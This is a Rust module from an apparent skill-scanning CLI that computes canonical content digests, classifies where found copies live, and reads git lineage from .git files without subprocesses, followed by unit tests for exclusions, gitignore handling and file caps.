//! Content identity for scanned assets (#274, #130).
//!
//! Provides a canonical content digest for a skill directory, provenance for
//! each location a copy was found in, and lineage metadata (git remote and
//! HEAD commit) read directly from `.git` files — no subprocesses, no network.
//!
//! The digest replicates the hub's `computeCanonicalSkillHash()`
//! (AgenticHighway/vettd `packages/api/src/skills/skill-hash.ts`): SHA-256 over
//! the JSON serialization of `[path, content]` pairs sorted bytewise by path.
//! Keeping both sides on one formula gives the CLI and the dashboard a single
//! canonical asset identity. Escaping is identical for ASCII content; non-ASCII
//! text may serialize differently (JS escapes U+2028/U+2029, serde does not).

use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};

/// Parity with the server-side GitHub fetcher limits (vettd-cli#204): 250 text
/// files and 10 MB of total text content.
pub(crate) const MAX_SKILL_FILES: usize = 250;
pub(crate) const MAX_SKILL_TOTAL_BYTES: u64 = 10 * 1024 * 1024;
/// Hard stop for the directory walk so a pathological tree cannot hang a scan.
const WALK_SAFETY_LIMIT: usize = 10_000;

/// Directories excluded from identity: version-control metadata.
const VCS_DIRS: [&str; 3] = [".git", ".hg", ".svn"];
/// Files excluded from identity: operating-system junk.
const OS_JUNK: [&str; 3] = [".DS_Store", "Thumbs.db", "desktop.ini"];
/// Path markers that make a home-directory location a user "installed" asset.
const INSTALLED_MARKERS: [&str; 6] = [
    ".claude/", ".codex/", ".cursor/", ".vscode/", ".config/", ".agents/",
];

/// Result of loading a skill directory for scanning and identity.
pub(crate) struct SkillFileLoad {
    /// Text files included in the scan and the digest, keyed by relative path.
    pub text_files: HashMap<String, String>,
    /// Every included file path (relative), including non-text files.
    pub all_paths: Vec<String>,
    /// Text-extension files that could not be decoded — reported, never silent.
    pub skipped: Vec<String>,
    /// Paths dropped from identity (VCS dirs, OS junk, own .gitignore matches).
    pub excluded: Vec<String>,
    /// True when a size/count cap cut the scan short.
    pub partial: bool,
    /// Stable reason codes for every way this load fell short of the whole
    /// skill (#314): `file-cap`, `size-cap`, `file-unreadable`,
    /// `unreadable-directory`, `unanalyzed-content`. Sorted, deduplicated;
    /// empty when complete.
    pub incomplete_reasons: Vec<&'static str>,
    /// Digest over every byte under the root (see [`bundle_digest`]); `None`
    /// when some entry could not be read, so it can never vouch for bytes it
    /// did not see (#315).
    pub bundle_digest: Option<String>,
}

/// Walk a skill directory deterministically, apply disclosed exclusions, and
/// load full text content under the server-parity caps.
pub(crate) fn load_skill_files(root: &Path) -> SkillFileLoad {
    let mut files: Vec<String> = Vec::new();
    let mut excluded: Vec<String> = Vec::new();
    let mut skipped: Vec<String> = Vec::new();
    let mut rules: Vec<IgnoreRule> = Vec::new();
    let mut partial = false;
    collect_files(
        root,
        "",
        &mut files,
        &mut excluded,
        &mut skipped,
        &mut rules,
        &mut partial,
    );
    files.sort();
    excluded.sort();
    skipped.sort();

    // Belt-and-braces: a single flat directory can overshoot the limit in one
    // pass; nested trees are cut off during the walk itself (see collect_files).
    if files.len() > WALK_SAFETY_LIMIT {
        partial = true;
        files.truncate(WALK_SAFETY_LIMIT);
    }

    let mut file_cap = files.len() > WALK_SAFETY_LIMIT;
    let mut size_cap = false;
    let mut text_files: HashMap<String, String> = HashMap::new();
    let mut total_bytes: u64 = 0;
    for rel in &files {
        if !is_likely_text(Path::new(rel)) {
            continue;
        }
        if text_files.len() >= MAX_SKILL_FILES {
            partial = true;
            file_cap = true;
            continue;
        }
        // Check the size before reading so a pathological file cannot blow up
        // memory before the cap is noticed.
        if let Ok(meta) = fs::metadata(root.join(rel)) {
            if total_bytes + meta.len() > MAX_SKILL_TOTAL_BYTES {
                partial = true;
                size_cap = true;
                continue;
            }
        }
        match fs::read_to_string(root.join(rel)) {
            Ok(content) => {
                if total_bytes + content.len() as u64 > MAX_SKILL_TOTAL_BYTES {
                    partial = true;
                    size_cap = true;
                    continue;
                }
                total_bytes += content.len() as u64;
                text_files.insert(rel.clone(), content);
            }
            Err(_) => skipped.push(rel.clone()),
        }
    }

    let mut incomplete_reasons: Vec<&'static str> = Vec::new();
    if file_cap {
        incomplete_reasons.push("file-cap");
    }
    if size_cap {
        incomplete_reasons.push("size-cap");
    }
    for entry in &skipped {
        incomplete_reasons.push(if entry.ends_with(UNREADABLE_DIR_SUFFIX) {
            "unreadable-directory"
        } else {
            "file-unreadable"
        });
    }
    let bundle = walk_bundle(root);
    // Excluded content must not gain trust by being excluded (#315): risky
    // entries the scanner never saw make the assessment partial.
    let analyzed: std::collections::HashSet<&str> = files.iter().map(String::as_str).collect();
    let unanalyzed_risky = bundle.entries.iter().any(|entry| {
        let name = entry.path.rsplit('/').next().unwrap_or(&entry.path);
        if OS_JUNK.iter().any(|junk| junk.eq_ignore_ascii_case(name)) {
            return false;
        }
        match entry.kind {
            // Symlinks are never followed or analyzed.
            BundleEntryKind::Symlink => true,
            // Not in the analyzed set: gitignored.
            _ if !analyzed.contains(entry.path.as_str()) => true,
            // Analyzed set but never decoded as text: risky when executable.
            BundleEntryKind::File => {
                !is_likely_text(Path::new(&entry.path))
                    && (entry.executable || is_executable_extension(&entry.path))
            }
            BundleEntryKind::Unreadable => false,
        }
    });
    if unanalyzed_risky {
        incomplete_reasons.push("unanalyzed-content");
    }
    if bundle.unreadable {
        incomplete_reasons.push("file-unreadable");
    }
    incomplete_reasons.sort_unstable();
    incomplete_reasons.dedup();

    SkillFileLoad {
        text_files,
        all_paths: files,
        skipped,
        excluded,
        partial,
        incomplete_reasons,
        bundle_digest: bundle.digest,
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BundleEntryKind {
    File,
    Symlink,
    Unreadable,
}

struct BundleEntry {
    /// Root-relative path, `/`-separated on every platform.
    path: String,
    kind: BundleEntryKind,
    /// Unix exec bit. Used only to classify risk, never hashed: Windows cannot
    /// observe it, and the digest must be the same on every platform.
    executable: bool,
}

struct BundleWalk {
    entries: Vec<BundleEntry>,
    digest: Option<String>,
    unreadable: bool,
}

/// Walk every entry under `root` except VCS metadata, without the .gitignore,
/// OS-junk, text-extension, or size filters the scan applies, and digest it.
///
/// `bundleDigest` (#315): SHA-256 over the JSON array of `[path, kind, value]`
/// sorted bytewise by path, where `kind` is `file` (value: SHA-256 hex of the
/// raw bytes) or `symlink` (value: link target, `/`-normalized, not followed).
/// Paths are `/`-separated. File modes are excluded so the digest is stable
/// across platforms. `None` when any entry was unreadable or the walk hit the
/// safety limit, since the digest could not cover every byte.
fn walk_bundle(root: &Path) -> BundleWalk {
    let mut walk = BundleWalk {
        entries: Vec::new(),
        digest: None,
        unreadable: false,
    };
    let mut records: Vec<(String, &'static str, String)> = Vec::new();
    walk_bundle_dir(root, "", &mut walk, &mut records);
    if walk.unreadable || walk.entries.len() > WALK_SAFETY_LIMIT {
        return walk;
    }
    records.sort_by(|a, b| a.0.as_bytes().cmp(b.0.as_bytes()));
    let serialized = serde_json::to_string(&records).unwrap_or_default();
    walk.digest = Some(format!("{:x}", Sha256::digest(serialized.as_bytes())));
    walk
}

fn walk_bundle_dir(
    dir: &Path,
    rel_prefix: &str,
    walk: &mut BundleWalk,
    records: &mut Vec<(String, &'static str, String)>,
) {
    if walk.entries.len() > WALK_SAFETY_LIMIT {
        return;
    }
    let Ok(read_dir) = fs::read_dir(dir) else {
        walk.unreadable = true;
        return;
    };
    for entry in read_dir {
        let Ok(entry) = entry else {
            walk.unreadable = true;
            continue;
        };
        let name = entry.file_name().to_string_lossy().to_string();
        let rel = if rel_prefix.is_empty() {
            name.clone()
        } else {
            format!("{rel_prefix}/{name}")
        };
        let Ok(file_type) = entry.file_type() else {
            walk.unreadable = true;
            walk.entries.push(BundleEntry {
                path: rel,
                kind: BundleEntryKind::Unreadable,
                executable: false,
            });
            continue;
        };
        if file_type.is_dir() {
            if !VCS_DIRS.contains(&name.as_str()) {
                walk_bundle_dir(&entry.path(), &rel, walk, records);
            }
        } else if file_type.is_symlink() {
            let target = fs::read_link(entry.path())
                .map(|t| t.to_string_lossy().replace('\\', "/"))
                .unwrap_or_default();
            records.push((rel.clone(), "symlink", target));
            walk.entries.push(BundleEntry {
                path: rel,
                kind: BundleEntryKind::Symlink,
                executable: false,
            });
        } else {
            // Regular files and any other entry kind (fifo, socket, device):
            // hash what can be read, and fail closed on what cannot.
            let hashed = fs::File::open(entry.path()).ok().and_then(|mut f| {
                let mut hasher = Sha256::new();
                std::io::copy(&mut f, &mut hasher).ok()?;
                Some(format!("{:x}", hasher.finalize()))
            });
            let kind = match hashed {
                Some(hash) => {
                    records.push((rel.clone(), "file", hash));
                    BundleEntryKind::File
                }
                None => {
                    walk.unreadable = true;
                    BundleEntryKind::Unreadable
                }
            };
            walk.entries.push(BundleEntry {
                executable: is_executable_mode(&entry),
                path: rel,
                kind,
            });
        }
    }
}

#[cfg(unix)]
fn is_executable_mode(entry: &fs::DirEntry) -> bool {
    use std::os::unix::fs::PermissionsExt;
    entry
        .metadata()
        .is_ok_and(|m| m.permissions().mode() & 0o111 != 0)
}

#[cfg(not(unix))]
fn is_executable_mode(_entry: &fs::DirEntry) -> bool {
    false
}

/// Extensions of executables and scripts the text scan does not decode.
fn is_executable_extension(path: &str) -> bool {
    let Some(extension) = Path::new(path).extension().and_then(|e| e.to_str()) else {
        return false;
    };
    matches!(
        extension.to_ascii_lowercase().as_str(),
        "exe"
            | "dll"
            | "so"
            | "dylib"
            | "bin"
            | "com"
            | "scr"
            | "msi"
            | "app"
            | "appimage"
            | "deb"
            | "rpm"
            | "apk"
            | "jar"
            | "class"
            | "wasm"
            | "pyc"
            | "ps1"
            | "psm1"
            | "bat"
            | "cmd"
            | "vbs"
            | "fish"
            | "pl"
            | "lua"
            | "r"
            | "scpt"
    )
}

const UNREADABLE_DIR_SUFFIX: &str = "(unreadable directory)";

/// Canonical content digest over a text-file map, matching the hub's
/// `computeCanonicalSkillHash`: entries sorted bytewise by path, serialized as
/// a JSON array of `[path, content]` pairs, hashed with SHA-256.
pub(crate) fn canonical_digest(text_files: &HashMap<String, String>) -> String {
    let mut entries: Vec<(&String, &String)> = text_files.iter().collect();
    entries.sort_by(|a, b| a.0.as_bytes().cmp(b.0.as_bytes()));
    let serialized = serde_json::to_string(&entries).unwrap_or_default();
    let mut hasher = Sha256::new();
    hasher.update(serialized.as_bytes());
    format!("{:x}", hasher.finalize())
}

/// Classify where a found copy lives. One ordered rules table (#274).
///
/// Only the real recycle/trash locations map to `trash`; a path that merely
/// contains a `tmp` component (e.g. `/home/u/proj/tmp/x`) is not trash.
/// Installed copies are detected before caches so agent plugin installs that
/// live under a `cache/` directory (e.g. `~/.claude/plugins/cache/...`)
/// classify as `installed` rather than `cache`.
pub(crate) fn provenance_for(path: &str) -> &'static str {
    let normalized = path.replace('\\', "/");
    let lower = normalized.to_lowercase();
    if lower.contains("/.trash/")
        || lower.ends_with("/.trash")
        || lower.contains("/.local/share/trash/")
        || lower.contains("/$recycle.bin/")
    {
        return "trash";
    }
    if let Some(home) = home_dir_normalized() {
        let home_lower = home.to_lowercase();
        let under_home = lower == home_lower
            || (lower.starts_with(&home_lower)
                && lower.as_bytes().get(home_lower.len()) == Some(&b'/'));
        if under_home && INSTALLED_MARKERS.iter().any(|m| lower.contains(m)) {
            return "installed";
        }
    }
    if lower.contains("/.cache/") || lower.contains("/cache/") || lower.contains("/caches/") {
        return "cache";
    }
    if lower.contains("/node_modules/")
        || lower.contains("/vendor/")
        || lower.contains("/site-packages/")
        || lower.contains("/pods/")
        || lower.contains("/target/")
    {
        return "vendored";
    }
    "bundled"
}

/// Cross-platform home directory normalized to forward slashes, so the
/// `installed` rule also fires on Windows (where `$HOME` is unset).
fn home_dir_normalized() -> Option<String> {
    dirs::home_dir()
        .or_else(|| std::env::var_os("HOME").map(std::path::PathBuf::from))
        .map(|home| home.to_string_lossy().replace('\\', "/"))
        .filter(|home| !home.is_empty())
}

/// Lineage metadata for relating copies of the same asset across versions.
#[derive(Debug, Clone, Default)]
pub(crate) struct AssetLineage {
    pub git_remote_url: Option<String>,
    pub git_commit: Option<String>,
}

/// Read lineage from the nearest enclosing `.git` directory (files only).
///
/// Only a path the enclosing repository actually tracks inherits its remote
/// and commit: an archive export, copy, or unrelated bundle that merely sits
/// under a checkout must not be attributed to that repository (vettd#1216).
/// Tracking is read from the repository's own index; an index this reader
/// cannot parse yields no lineage (fail closed).
pub(crate) fn lineage_for(path: &Path) -> AssetLineage {
    let Some((work_root, git_dir)) = find_git_dir(path) else {
        return AssetLineage::default();
    };
    if !is_tracked(&work_root, &git_dir, path) {
        return AssetLineage::default();
    }
    AssetLineage {
        git_remote_url: read_git_remote(&git_dir),
        git_commit: read_git_head_commit(&git_dir),
    }
}

/// Whether `path` (a file, or a directory containing tracked files) is in
/// the index of the repository rooted at `work_root`.
///
/// The comparison is component-wise on the path as the filesystem reports it,
/// so a literal backslash in a Unix file name never compares equal to a `/`
/// separator (#1216). A path that cannot be represented losslessly (invalid
/// UTF-8) is not matched: the caller fails closed rather than guessing.
pub(super) fn is_tracked(work_root: &Path, git_dir: &Path, path: &Path) -> bool {
    let Ok(rel) = path.strip_prefix(work_root) else {
        return false;
    };
    let Some(rel) = native_git_relative_path(rel) else {
        return false;
    };
    if rel.is_empty() {
        return true;
    }
    let dir_prefix = format!("{rel}/");
    index_paths(git_dir).is_some_and(|paths| {
        paths
            .iter()
            .any(|p| p == &rel || p.starts_with(&dir_prefix))
    })
}

/// Render a path relative to a work tree the way a Git index does.
///
/// On Unix this is the bytes the filesystem reports, with no separator
/// rewriting; `None` when the name is not valid UTF-8, because a lossy
/// conversion could alias two different names.
fn native_git_relative_path(rel: &Path) -> Option<String> {
    let rel = rel.to_str()?;
    #[cfg(windows)]
    {
        // Windows uses `\` natively; the index always uses `/`.
        Some(rel.replace('\\', "/"))
    }
    #[cfg(not(windows))]
    {
        Some(rel.to_string())
    }
}

/// Entry paths from a git index (`DIRC`, versions 2 and 3). Version 4
/// (prefix-compressed paths) and anything structurally invalid return `None`:
/// entry padding, the extension section, and the trailing SHA-1 checksum are
/// all validated before any path is trusted.
fn index_paths(git_dir: &Path) -> Option<Vec<String>> {
    let data = fs::read(git_dir.join("index")).ok()?;
    if data.get(0..4)? != b"DIRC" {
        return None;
    }
    let version = u32::from_be_bytes(data.get(4..8)?.try_into().ok()?);
    if version != 2 && version != 3 {
        return None;
    }
    let count = u32::from_be_bytes(data.get(8..12)?.try_into().ok()?);
    // The trailer is a SHA-1 over everything before it.
    let body_end = data.len().checked_sub(20)?;
    if body_end < 12 {
        return None;
    }
    let mut paths = Vec::new();
    let mut pos = 12usize;
    for _ in 0..count {
        // 40 bytes of stat data + 20-byte object id, then 16-bit flags.
        let flags_at = pos.checked_add(60)?;
        let flags = u16::from_be_bytes(data.get(flags_at..flags_at + 2)?.try_into().ok()?);
        let mut name_at = flags_at + 2;
        if flags & 0x4000 != 0 {
            if version < 3 {
                return None;
            }
            name_at += 2;
        }
        let nul = data.get(name_at..body_end)?.iter().position(|&b| b == 0)?;
        let name_end = name_at + nul;
        // A path the index cannot represent losslessly is not trusted.
        let name = String::from_utf8(data.get(name_at..name_end)?.to_vec()).ok()?;
        // Entries are NUL-padded (at least one NUL) to a multiple of 8 bytes.
        let entry_len = (name_end - pos + 1).div_ceil(8) * 8;
        let entry_end = pos.checked_add(entry_len)?;
        if entry_end > body_end || entry_len % 8 != 0 {
            return None;
        }
        // Every padding byte between the name and the next entry is NUL.
        if data.get(name_end..entry_end)?.iter().any(|&b| b != 0) {
            return None;
        }
        paths.push(name);
        pos = entry_end;
    }
    // Optional extension headers must tile the gap up to the trailer exactly.
    while pos < body_end {
        let header = data.get(pos..pos + 8)?;
        let size = u32::from_be_bytes(header[4..8].try_into().ok()?) as usize;
        pos = pos.checked_add(8)?.checked_add(size)?;
        if pos > body_end {
            return None;
        }
    }
    if pos != body_end {
        return None;
    }
    // The checksum must match, or the entry data cannot be trusted.
    if data.get(body_end..)? != sha1_digest(data.get(..body_end)?).as_slice() {
        return None;
    }
    Some(paths)
}

fn sha1_digest(bytes: &[u8]) -> [u8; 20] {
    let mut hasher = sha1::Sha1::new();
    hasher.update(bytes);
    hasher.finalize().into()
}

/// Test fixture: a minimal git index (version 2) listing `paths`, laid out as
/// git writes it, trailer checksum included.
#[cfg(test)]
pub(crate) fn write_test_index(git_dir: &Path, paths: &[&str]) {
    let mut sorted = paths.to_vec();
    sorted.sort_unstable();
    let mut out = b"DIRC".to_vec();
    out.extend(2u32.to_be_bytes());
    out.extend((sorted.len() as u32).to_be_bytes());
    for path in sorted {
        let mut entry = vec![0u8; 60];
        entry.extend((path.len() as u16 & 0x0fff).to_be_bytes());
        entry.extend(path.as_bytes());
        entry.resize((62 + path.len() + 8) & !7, 0);
        out.extend(entry);
    }
    let checksum = sha1_digest(&out);
    out.extend(checksum);
    fs::write(git_dir.join("index"), out).unwrap();
}

/// The nearest enclosing work tree root and its git directory.
pub(super) fn find_git_dir(path: &Path) -> Option<(PathBuf, PathBuf)> {
    let mut current = if path.is_dir() {
        path.to_path_buf()
    } else {
        path.parent()?.to_path_buf()
    };
    loop {
        let candidate = current.join(".git");
        if candidate.is_dir() {
            return Some((current, candidate));
        }
        if candidate.is_file() {
            // Worktrees and submodules use a `.git` file pointing at the real
            // git directory via `gitdir: <path>`.
            if let Some(dir) = resolve_gitdir_file(&candidate) {
                return Some((current, dir));
            }
        }
        if !current.pop() {
            return None;
        }
    }
}

fn resolve_gitdir_file(git_file: &Path) -> Option<PathBuf> {
    let content = fs::read_to_string(git_file).ok()?;
    let rest = content.trim().strip_prefix("gitdir: ")?;
    let dir = Path::new(rest.trim());
    let dir = if dir.is_absolute() {
        dir.to_path_buf()
    } else {
        git_file.parent()?.join(dir)
    };
    dir.is_dir().then_some(dir)
}

/// For worktrees, shared config and packed-refs live in the common git dir
/// referenced by the worktree's `commondir` file.
fn commdir(git_dir: &Path) -> Option<PathBuf> {
    let raw = fs::read_to_string(git_dir.join("commondir")).ok()?;
    let dir = Path::new(raw.trim());
    let dir = if dir.is_absolute() {
        dir.to_path_buf()
    } else {
        git_dir.join(dir)
    };
    dir.is_dir().then_some(dir)
}

/// `<gitdir>/config` (or the worktree's common dir), sanitized.
pub(super) fn read_git_remote(git_dir: &Path) -> Option<String> {
    read_remote_from_config(git_dir)
        .or_else(|| commdir(git_dir).and_then(|c| read_remote_from_config(&c)))
}

fn read_remote_from_config(git_dir: &Path) -> Option<String> {
    let config = fs::read_to_string(git_dir.join("config")).ok()?;
    for line in config.lines() {
        if let Some((_, url)) = line.split_once("url = ") {
            let url = url.trim();
            if !url.is_empty() {
                return Some(super::helpers::sanitize_git_remote_url(url));
            }
        }
    }
    None
}

fn read_git_head_commit(git_dir: &Path) -> Option<String> {
    let head = fs::read_to_string(git_dir.join("HEAD")).ok()?;
    let head = head.trim();
    if let Some(rest) = head.strip_prefix("ref: ") {
        let refname = rest.trim();
        if let Ok(content) = fs::read_to_string(git_dir.join(refname)) {
            let sha = content.trim().to_string();
            if is_sha(&sha) {
                return Some(sha);
            }
        }
        return read_packed_ref(git_dir, refname)
            .or_else(|| commdir(git_dir).and_then(|c| read_packed_ref(&c, refname)));
    }
    if is_sha(head) {
        return Some(head.to_string());
    }
    None
}

fn read_packed_ref(git_dir: &Path, refname: &str) -> Option<String> {
    let content = fs::read_to_string(git_dir.join("packed-refs")).ok()?;
    for line in content.lines() {
        if line.starts_with('#') || line.starts_with('^') {
            continue;
        }
        if let Some((sha, r#ref)) = line.split_once(' ') {
            if r#ref.trim() == refname && is_sha(sha) {
                return Some(sha.to_string());
            }
        }
    }
    None
}

fn is_sha(value: &str) -> bool {
    value.len() == 40 && value.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Extension heuristic for "is this a text file we should scan and hash".
pub(crate) fn is_likely_text(path: &Path) -> bool {
    let Some(extension) = path.extension().and_then(|e| e.to_str()) else {
        // Extension-less files (Dockerfile, Makefile, LICENSE) are text.
        return true;
    };
    matches!(
        extension.to_ascii_lowercase().as_str(),
        "md" | "txt"
            | "json"
            | "yaml"
            | "yml"
            | "toml"
            | "sh"
            | "bash"
            | "zsh"
            | "py"
            | "js"
            | "ts"
            | "mjs"
            | "cjs"
            | "rs"
            | "go"
            | "rb"
            | "php"
            | "java"
            | "kt"
            | "swift"
            | "c"
            | "cpp"
            | "h"
            | "cs"
            | "html"
            | "xml"
            | "css"
            | "sql"
            | "env"
            | "ini"
            | "cfg"
            | "conf"
            | "lock"
    )
}

// --- own .gitignore matching (minimal subset) ---------------------------------
//
// Supported: bare names (match any path component), `/`-anchored patterns,
// `*` wildcards within a component, `#` comments, and `!` negations with
// git's last-matching-rule-wins semantics. NOT supported: `**`, `?`,
// character classes, escapes. Negating a path inside an already-ignored
// directory does not re-include it, matching git's own behavior.

struct IgnoreRule {
    base: String,
    pattern: String,
    anchored: bool,
    negated: bool,
}

fn parse_gitignore(content: &str, base: &str) -> Vec<IgnoreRule> {
    content
        .lines()
        .filter_map(|line| {
            let line = line.trim_end();
            if line.is_empty() || line.starts_with('#') {
                return None;
            }
            let negated = line.starts_with('!');
            let line = if negated { &line[1..] } else { line };
            let anchored = line.starts_with('/');
            let pattern = line.trim_matches('/').trim().to_string();
            if pattern.is_empty() {
                return None;
            }
            Some(IgnoreRule {
                base: base.to_string(),
                pattern,
                anchored,
                negated,
            })
        })
        .collect()
}

fn matches_ignore(rel: &str, rules: &[IgnoreRule]) -> bool {
    // Git semantics: the last matching rule decides.
    let mut ignored = false;
    for rule in rules {
        if matches_rule(rule, rel) {
            ignored = !rule.negated;
        }
    }
    ignored
}

fn matches_rule(rule: &IgnoreRule, rel: &str) -> bool {
    if !rel.starts_with(&rule.base) {
        return false;
    }
    let rest = &rel[rule.base.len()..];
    let pattern_parts: Vec<&str> = rule.pattern.split('/').filter(|p| !p.is_empty()).collect();
    let rel_parts: Vec<&str> = rest.split('/').filter(|p| !p.is_empty()).collect();
    if pattern_parts.is_empty() || rel_parts.is_empty() {
        return false;
    }
    let starts: Vec<usize> = if rule.anchored {
        vec![0]
    } else {
        (0..rel_parts.len()).collect()
    };
    starts.into_iter().any(|start| {
        rel_parts.len() - start == pattern_parts.len()
            && pattern_parts
                .iter()
                .zip(rel_parts[start..].iter())
                .all(|(p, r)| glob_match(p, r))
    })
}

fn glob_match(pattern: &str, text: &str) -> bool {
    if !pattern.contains('*') {
        return pattern == text;
    }
    let parts: Vec<&str> = pattern.split('*').collect();
    let Some((first, middle_and_last)) = parts.split_first() else {
        return true;
    };
    let Some((last, middle)) = middle_and_last.split_last() else {
        return true;
    };
    if !text.starts_with(first) || !text.ends_with(last) {
        return false;
    }
    let mut remaining = &text[first.len()..text.len() - last.len()];
    middle.iter().all(|segment| match remaining.find(segment) {
        Some(index) => {
            remaining = &remaining[index + segment.len()..];
            true
        }
        None => false,
    })
}

// --- walk --------------------------------------------------------------------

fn collect_files(
    dir: &Path,
    rel_prefix: &str,
    files: &mut Vec<String>,
    excluded: &mut Vec<String>,
    skipped: &mut Vec<String>,
    rules: &mut Vec<IgnoreRule>,
    partial: &mut bool,
) {
    // Stop descending once the safety limit is reached so a pathological tree
    // is not fully walked before the cap is noticed (#204).
    if files.len() > WALK_SAFETY_LIMIT {
        *partial = true;
        return;
    }
    let Ok(read_dir) = fs::read_dir(dir) else {
        // An unreadable directory truncates the scan — report it, never silent.
        let dir_rel = if rel_prefix.is_empty() {
            "."
        } else {
            rel_prefix
        };
        skipped.push(format!("{dir_rel}/ {UNREADABLE_DIR_SUFFIX}"));
        *partial = true;
        return;
    };
    let mut entries: Vec<fs::DirEntry> = read_dir.flatten().collect();
    entries.sort_by_key(|entry| entry.file_name().to_string_lossy().to_string());
    // Load this directory's own .gitignore before walking its entries: they are
    // sorted by name, so `.env` would otherwise be read before its rule exists.
    let gitignore_rel = if rel_prefix.is_empty() {
        ".gitignore".to_string()
    } else {
        format!("{rel_prefix}/.gitignore")
    };
    let gitignore = entries.iter().find(|entry| {
        entry.file_name() == ".gitignore" && entry.file_type().is_ok_and(|t| t.is_file())
    });
    if let Some(entry) = gitignore {
        if !matches_ignore(&gitignore_rel, rules) {
            if let Ok(content) = fs::read_to_string(entry.path()) {
                rules.extend(parse_gitignore(&content, rel_prefix));
            }
        }
    }
    for entry in entries {
        let name = entry.file_name().to_string_lossy().to_string();
        let rel = if rel_prefix.is_empty() {
            name.clone()
        } else {
            format!("{rel_prefix}/{name}")
        };
        let Ok(file_type) = entry.file_type() else {
            skipped.push(format!("{rel} (unreadable entry)"));
            *partial = true;
            continue;
        };
        if file_type.is_dir() {
            if VCS_DIRS.contains(&name.as_str()) || matches_ignore(&rel, rules) {
                excluded.push(format!("{rel}/"));
                continue;
            }
            collect_files(
                &entry.path(),
                &rel,
                files,
                excluded,
                skipped,
                rules,
                partial,
            );
        } else if file_type.is_file() {
            if OS_JUNK.iter().any(|junk| junk.eq_ignore_ascii_case(&name)) {
                excluded.push(rel);
                continue;
            }
            if matches_ignore(&rel, rules) {
                excluded.push(rel);
                continue;
            }
            files.push(rel);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn fixture_root(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("vettd-identity-{tag}"));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn canonical_digest_matches_hub_compute_canonical_skill_hash() {
        // Fixture cross-checked against the hub formula:
        // sha256(JSON.stringify([["SKILL.md",...],["references/guide.md",...]]))
        // computed independently with python3 json.dumps(separators=(',',':')).
        let mut files = HashMap::new();
        files.insert(
            "SKILL.md".to_string(),
            "---\nname: demo\ndescription: A demo skill\n---\n\n# Demo\n\nRun `ls`.\n".to_string(),
        );
        files.insert(
            "references/guide.md".to_string(),
            "# Guide\n\nStep one.\n".to_string(),
        );
        assert_eq!(
            canonical_digest(&files),
            "215ae3b9961f76cf7ef0e536fe4c9a4e2200f9420491651cfe6b7c5f0d423f5a"
        );
    }

    #[test]
    fn digest_changes_when_bytes_past_8kb_differ() {
        // Why this matters: the old loader truncated every file at 8192 chars,
        // so a payload hidden past 8KB was invisible to scanning AND to any
        // content hash. A byte change past the old cap must move the digest.
        let base = "a".repeat(9_000);
        let mut changed = base.clone();
        changed.replace_range(8_500..8_501, "b");
        let mut files_a = HashMap::new();
        files_a.insert("SKILL.md".to_string(), base);
        let mut files_b = HashMap::new();
        files_b.insert("SKILL.md".to_string(), changed);
        assert_ne!(canonical_digest(&files_a), canonical_digest(&files_b));
    }

    #[test]
    fn load_excludes_vcs_dirs_and_os_junk_and_lists_them() {
        let root = fixture_root("exclusions");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(root.join(".git/config"), "[remote]\n").unwrap();
        fs::create_dir_all(root.join("sub")).unwrap();
        fs::write(root.join("sub/.DS_Store"), "junk").unwrap();
        fs::write(root.join("sub/keep.md"), "keep").unwrap();

        let load = load_skill_files(&root);
        assert!(load.excluded.contains(&".git/".to_string()));
        assert!(load.excluded.contains(&"sub/.DS_Store".to_string()));
        assert!(load.all_paths.contains(&"sub/keep.md".to_string()));
        assert!(!load.all_paths.contains(&"sub/.DS_Store".to_string()));
        assert!(!load.text_files.contains_key(".git/config"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_honours_the_assets_own_gitignore() {
        let root = fixture_root("gitignore");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join(".gitignore"), "generated/\n*.bak\n").unwrap();
        fs::create_dir_all(root.join("generated")).unwrap();
        fs::write(root.join("generated/blob.md"), "ignored").unwrap();
        fs::write(root.join("notes.bak"), "ignored").unwrap();
        fs::write(root.join("notes.md"), "kept").unwrap();

        let load = load_skill_files(&root);
        assert!(load.excluded.contains(&"generated/".to_string()));
        assert!(load.excluded.contains(&"notes.bak".to_string()));
        assert!(load.text_files.contains_key("notes.md"));
        assert!(!load.text_files.contains_key("generated/blob.md"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_never_reads_a_gitignored_file_that_sorts_before_the_gitignore() {
        // `.env` sorts before `.gitignore`; walking in name order used to read
        // and hash it before its rule was loaded, feeding secrets to the digest.
        let root = fixture_root("gitignore-order");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join(".gitignore"), ".env\n").unwrap();
        fs::write(root.join(".env"), "TOKEN=secret").unwrap();

        let load = load_skill_files(&root);
        assert!(load.excluded.contains(&".env".to_string()));
        assert!(!load.text_files.contains_key(".env"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_caps_at_250_text_files_deterministically_and_flags_partial() {
        let root = fixture_root("cap");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        for i in 0..300 {
            fs::write(root.join(format!("f{i:03}.md")), format!("file {i}")).unwrap();
        }

        let load = load_skill_files(&root);
        assert!(load.partial);
        // #314: the cap must be named so the record says why it is partial.
        assert_eq!(load.incomplete_reasons, vec!["file-cap"]);
        // Deterministic: the 250 lowest sorted paths survive, never a random
        // read_dir-order subset.
        assert_eq!(load.text_files.len(), MAX_SKILL_FILES);
        assert!(load.text_files.contains_key("f000.md"));
        assert!(load.text_files.contains_key("f248.md"));
        assert!(!load.text_files.contains_key("f249.md"));
        fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn load_reports_non_utf8_files_instead_of_skipping_silently() {
        let root = fixture_root("nonutf8");
        fs::write(root.join("SKILL.md"), "# skill\n").unwrap();
        fs::write(root.join("payload.sh"), [0xff_u8, 0xfe, 0x00, 0x80]).unwrap();

        let load = load_skill_files(&root);
        assert_eq!(load.skipped, vec!["payload.sh".to_string()]);
